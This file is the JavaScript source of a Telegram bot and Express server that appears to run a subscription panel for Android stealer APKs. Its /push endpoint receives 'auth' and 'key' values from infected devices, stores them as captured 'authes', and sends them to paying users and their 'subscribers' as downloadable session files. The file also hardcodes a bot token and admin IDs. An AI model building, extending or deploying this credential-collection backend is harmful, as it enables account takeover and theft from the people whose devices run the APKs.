const token = "7204484658:AAECe0DHiD_c9Km19qQ61TWWeE5tP7odeH4";
const admins = [5483232752, 5047714806];

const TelegramBot = require("node-telegram-bot-api");
const { JsonCore } = require("./jsoncore.js");
const express = require("express");
const fs = require("fs");

const bot = new TelegramBot(token, { polling: true });
const jsc = new JsonCore();
const web = express();

web.use(express.json());
web.use(express.urlencoded({ extended: true }));

function makeFont(string) {
    const s = string;
    const mapping = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ',
        't': 'ᴛ', 'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ',
        'o': 'ᴏ', 'p': 'ᴘ', 'a': 'ᴀ', 's': 's',
        'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ',
        'n': 'ɴ', 'm': 'ᴍ'
    };

    return s.split('').map(char => mapping[char] || char).join('');
}

/* SET FILE IDS */

function getPackFileId(dominant){
  return {test: "TESTING-FILE-ID"}[dominant];
}

function checkUsers(){
  const now = new Date().getTime();
  const users = jsc.getUsers();
  for (let user of users){
    if (user["has_port"]){
      if (user["port"]["end"] < now){
        jsc.removePort(user["userid"]);
      }
    }
  }
}

function convertMilliseconds(milliseconds) {
    const millisecondsInDay = 24 * 60 * 60 * 1000; // تعداد میلی‌ثانیه‌ها در یک روز
    const millisecondsInWeek = 7 * millisecondsInDay; // تعداد میلی‌ثانیه‌ها در یک هفته
    const millisecondsInMonth = 30 * millisecondsInDay; // تعداد میلی‌ثانیه‌ها در یک ماه (تقریبی)
    const millisecondsInYear = 12 * millisecondsInMonth; // تعداد میلی‌ثانیه‌ها در یک سال (تقریبی)

    const millisecondsInHour = 60 * 60 * 1000; // تعداد میلی‌ثانیه‌ها در یک ساعت
    const millisecondsInMinute = 60 * 1000; // تعداد میلی‌ثانیه‌ها در یک دقیقه
    const millisecondsInSecond = 1000; // تعداد میلی‌ثانیه‌ها در یک ثانیه

    let years = Math.floor(milliseconds / millisecondsInYear);
    milliseconds %= millisecondsInYear;

    let months = Math.floor(milliseconds / millisecondsInMonth);
    milliseconds %= millisecondsInMonth;

    let weeks = Math.floor(milliseconds / millisecondsInWeek);
    milliseconds %= millisecondsInWeek;

    let days = Math.floor(milliseconds / millisecondsInDay);
    milliseconds %= millisecondsInDay;

    let hours = Math.floor(milliseconds / millisecondsInHour);
    milliseconds %= millisecondsInHour;

    let minutes = Math.floor(milliseconds / millisecondsInMinute);
    milliseconds %= millisecondsInMinute;

    let seconds = Math.floor(milliseconds / millisecondsInSecond);

    // نمایش نتایج
    return {
        years,
        months,
        weeks,
        days,
        hours,
        minutes,
        seconds
    };
}

web.post("/push", (req, res) => {
  const body = req.body;
  if (!(Object.keys(body).includes("from_port"))){
    res.json(
      {
        status: "INVALID_INPUT"
      }
    );
  } else {
    const us = jsc.getUserByPort(body.from_port);
    if (us["status"] !== "OK"){
      res.json({status: us["status"]});
      return;
    } else if (us["user"]["has_port"] !== true){
      res.json({status: "NEED_VERIFY"});
      return;
    }
    res.json(
      jsc.addAuth(us.user.userid, { auth: body.auth, key: body.key })
    );
  }
})

bot.on("polling_error", (err) => { console.log(err); })

bot.on("message", (msg) => {
  msg.text = msg.text.toLowerCase();
  //console.log(msg)
  if (admins.includes(msg.from.id)){
    if (msg.text.startsWith("/start")){
      bot.sendMessage(
        msg.chat.id,
        makeFont("Admin Panel 💬\n\n/port <...userid...> <...mode...> ☎️\n/delport <...userid...> 📪\n/see <...userid...> 🕹"),
        { reply_to_message_id: msg.message_id }
      )
    } else if (msg.text.startsWith("/port")){
      const spls = msg.text.split(" ");
      const uid = parseInt(spls[1]);
      const mode = spls[2];
      const dominant = spls[3];
      const stat = jsc.createPort(uid, mode, dominant);
      console.log(stat)
      if (stat["status"] === 'OK'){
        bot.sendMessage(
          msg.chat.id,
          makeFont(`Port added ! 🧭\n\n🎫 Port owner: ${uid}\n🍭 Mode: ${mode}\n🎲 Dominant: ${dominant}\n🔹️ Created port: ${stat.port} | `) + `<code>${stat.port}</code>`,
          { parse_mode: "HTML", reply_to_message_id: msg.message_id }
        )
      } else {
        bot.sendMessage(
          msg.chat.id,
          makeFont("user id not found 🥢🥱"),
          { reply_to_message_id: msg.message_id }
        )
      }
    } else if (msg.text.startsWith("/delport")){
      const uid = parseInt(msg.text.split(" ")[1]);
      jsc.removePort(uid);
      bot.sendMessage(msg.chat.id, makeFont("Port was deleted 🤚🏻🗿"), { reply_to_message_id: msg.message_id })
    } else if (msg.text.startsWith("/edit")){
      const spls = msg.text.split(" ");
      const uid = parseInt(spls[1]);
      const ints = parseInt(spls[2]);
      const mode = spls[3];
      const user = jsc.isExists(uid);
      const users = jsc.getUsers();
      if (user["status"] == "OK"){
        if (user.user.has_port){
          if (mode == "+"){
            users[user.index].port.end += ints;
          } else if (mode == "-"){
            users[user.index].port.end -= ints;
          }

          fs.writeFileSync("fdsuhfdushfsdf9hdsf89hsd9fh8dsfsdfuhusdfusdfsdf/users.json", JSON.stringify(users));
          bot.sendMessage(msg.chat.id, makeFont("changes saved 🎖"), { reply_to_message_id: msg.message_id })

        } else { bot.sendMessage(msg.chat.id, makeFont("user has no port 🌐"), { reply_to_message_id: msg.message_id }) }
      } else { bot.sendMessage(msg.chat.id, makeFont("invalid userid 🛑"), { reply_to_message_id: msg.message_id }) }
    } else if (msg.text.startsWith("/see")){
      const spls = msg.text.split(" ");
      const uid = parseInt(spls[1]);
      const user = jsc.isExists(uid);
      if (user["status"] === "OK"){
        let message = `Profile Page🧩🔮\n\n🎟 Uid: ${user["user"]["userid"]}`;
        if (user["user"]["has_port"]){
          let ud = convertMilliseconds(user["user"]["port"]["end"] - new Date().getTime());
          message += "\n🪡 Has port: true";
          console.log(ud)
          if (ud.years == 0){
            if (ud.months == 0){
              if (ud.weeks == 0){
                if (ud.days == 0){
                  if (ud.hours == 0){
                    if (ud.minutes == 0){
                      message += `\n🔋 Will end in ${ud.seconds} seconds`;
                    } else { message += `\n🔋 Will end in ${ud.minutes} minutes`; }
                  } else { message += `\n🔋 Will end in ${ud.hours} hours`; }
                } else { message += `\n🔋 Will end in ${ud.days} days`; }
              } else { message += `\n🔋 Will end in ${ud.weeks} weeks`; }
            } else { message += `\n🔋 Will end in ${ud.months} months`; }
          } else { message += `\n🔋 Will end in ${ud.years} years`; }

          message += `\n🎞  Port mode: ${user["user"]["port"]["mode"]}`;
          message += `\n📪 Dominant ( APK ): ${user["user"]["dominant"]}`;
          message += `\n👥️ Subscribers: ${JSON.stringify(user.user.subs, null, 2)}`
          message += `\n🔦 Port: `;
          bot.sendMessage(msg.chat.id, makeFont(message) + `<code>${user["user"]["port"]["hash"]}</code>`, { reply_to_message_id: msg.message_id, parse_mode: "HTML" })
          } else { message += `\n🪡 Has port: false`; bot.sendMessage(msg.chat.id, makeFont(message) , { reply_to_message_id: msg.message_id, parse_mode: "HTML" }) }
        } else {
        bot.sendMessage(msg.chat.id, makeFont("user has not signed up 🥃"), { reply_to_message_id: msg.message_id })
      }
    }
  }

  if (msg.text.startsWith("/install")){
    const user = jsc.isExists(msg.from.id);
    if (!(user["status"] == "OK")){
    jsc.addUser({ userid: msg.from.id });
    bot.sendMessage(
      msg.chat.id,
      makeFont("You signed up 🗣👀"),
      { reply_to_message_id: msg.message_id }
    )
    } else {
      bot.sendMessage(
        msg.chat.id,
        makeFont("You already logged in 📶"),
        { reply_to_message_id: msg.message_id }
      )
    }
  } else if (msg.text.startsWith("/profile")){
    const user = jsc.isExists(msg.from.id);
    if (user["status"] === "OK"){
      let message = `Profile Page🧩🔮\n\n🎟 Uid: ${user["user"]["userid"]}`;
      if (user["user"]["has_port"]){
        let ud = convertMilliseconds(user["user"]["port"]["end"] - new Date().getTime());
        message += "\n🪡 Has port: true";
        console.log(ud)
        if (ud.years == 0){
          if (ud.months == 0){
            if (ud.weeks == 0){
              if (ud.days == 0){
                if (ud.hours == 0){
                  if (ud.minutes == 0){
                    message += `\n🔋 Will end in ${ud.seconds} seconds`;
                  } else { message += `\n🔋 Will end in ${ud.minutes} minutes`; }
                } else { message += `\n🔋 Will end in ${ud.hours} hours`; }
              } else { message += `\n🔋 Will end in ${ud.days} days`; }
            } else { message += `\n🔋 Will end in ${ud.weeks} weeks`; }
          } else { message += `\n🔋 Will end in ${ud.months} months`; }
        } else { message += `\n🔋 Will end in ${ud.years} years`; }

        message += `\n🎞  Port mode: ${user["user"]["port"]["mode"]}`;
        message += `\n📪 Dominant ( APK ): ${user["user"]["dominant"]}`;
        message += `\n👥️ Subscribers: ${JSON.stringify(user.user.subs, null, 2)}`
        message += `\n🔦 Port: `;
        bot.sendMessage(msg.chat.id, makeFont(message) + `<code>${user["user"]["port"]["hash"]}</code>` + makeFont("\n\n📌 Note: make sure you started bot in pv •"), { reply_to_message_id: msg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [ [{ text: makeFont("get session 📥"), callback_data: "getSession" }] ] } })
        } else { message += `\n🪡 Has port: false`; bot.sendMessage(msg.chat.id, makeFont(message) + makeFont("\n\n📌 Note: make sure you started bot in pv •") , { reply_to_message_id: msg.message_id, parse_mode: "HTML" }) }
      } else {
        bot.sendMessage(msg.chat.id, makeFont("sign up with /install first 🥃"), { reply_to_message_id: msg.message_id })
      }
    } else if (msg.text.startsWith("/report")){
      const length = jsc.getAuthesLength(msg.from.id);
      if (length["status"] == "OK"){
      bot.sendMessage(msg.chat.id, makeFont(`You are including ${length.length} authes 🌊`), { reply_to_message_id: msg.message_id })
    }else{
      bot.sendMessage(msg.chat.id, makeFont("no session detected for you 🥱"), { reply_to_message_id: msg.message_id })
    } 
  } else if (msg.text.startsWith("/addsub")){
    const spls = msg.text.split(" ");
    const uid = parseInt(spls[1]);
    const s = jsc.addSub(msg.from.id, uid);
    let text = "";
    if (s.status == "OK"){
      text += "User added to your Subscribers 🦫\nYour authes will be send for him/her ... 🗯";
    } else if (s.status == "MAX_SUBS"){
      text += "You are fully of Subscribers ! 🐱";
    } else if (s.status == "SUB_HAS_NO_PORT"){
      text += "User has no port yet 🍆";
    } else if (s.status == "USER_HAS_NO_PORT"){
      text += "You have no port yet 🍌";
    } else if (s.status == "INVALID_USER" || s.status == "INVALID_SUB"){
      text += "You or your Uid has no registery in bot, send /install (both) and try again 🍓";
    }

    bot.sendMessage(msg.chat.id, makeFont(text), {reply_to_message_id: msg.message_id})

  } else if (msg.text.startsWith("/delsub")){
    const spls = msg.text.split(" ");
    const uid = parseInt(spls[1]);
    const s = jsc.removeSub(msg.from.id, uid);
    console.log(s)
    let text = "";
    if (s.status == "OK"){
      text += `The uid ${uid} were deleted from your subs ! 🏭`;
    } else if (s.status == "NO_INCLUDE_FOUND"){
      text += `The uid ${uid} were not in your subs list 🪵`;
    } else { text += "Please first send /install then try again 🏔" }
    bot.sendMessage(msg.chat.id, makeFont(text), {reply_to_message_id: msg.message_id})
  } else if (msg.text.startsWith("/apk") && jsc.isExists(msg.chat.id).status == "OK"){
    const spls = msg.text.split(" ");
    const dominant = spls[1];
    bot.sendMessage(msg.chat.id, getPackFileId(dominant)+"\n This message will send as Document", { reply_to_message_id: msg.message_id });
  } else if (msg.text.startsWith("/start") && !admins.includes(msg.from.id)){
    bot.sendMessage(
      msg.chat.id,
      makeFont(`welcome [${msg.from.first_name}](tg://openmessage?user_id=${msg.from.id}) user !\nread documentation carefully then use the bot 👀\n\n`) + "/start" + makeFont(" - start the bot\n") + "/install" + makeFont(" - signup in bot\n") + "/apk" + makeFont(" - get the specified apk (only in pv)\n") + "/profile" + makeFont(" - see your profile info\n") + "/report" + makeFont(" - the length of authes were captured by server\n") + "/addsub <userid>" + makeFont(" - set subscriber (your authes will write for him/her if captured)\n") + "/delsub <userid>" + makeFont(" - delete subscriber\n\n📌 Note: make sure you started bot in pv •"),
      { reply_to_message_id: msg.message_id, parse_mode: "Markdown", reply_markup: { inline_keyboard: [ [{ text: makeFont("close"), callback_data: "close" }] ] } }
    )
  }

})

bot.on("callback_query", (call) => {
  //console.log(call.message.reply_to_message)
  if (call.data === "close"){
    bot.deleteMessage(call.message.chat.id, call.message.message_id);
  } else {
    const user = jsc.isExists(call.from.id);
    if (call.from.id == call.message.reply_to_message.from.id && user["status"] == "OK"){
      if (user["user"]["has_port"]){
        try{
            bot.sendDocument(call.from.id, `fdsuhfdushfsdf9hdsf89hsd9fh8dsfsdfuhusdfusdfsdf/authes/${call.from.id}.pack`);
        } catch (e) {
          bot.sendMessage(call.chat.id, makeFont("Please start bot in PV first ! 💬"), { reply_to_message_id: call.message.message_id })
        }
      }
    }
  }
})

setInterval(() => {checkUsers()}, 60000);
web.listen(8080, "0.0.0.0", () => { console.log("connected"); })
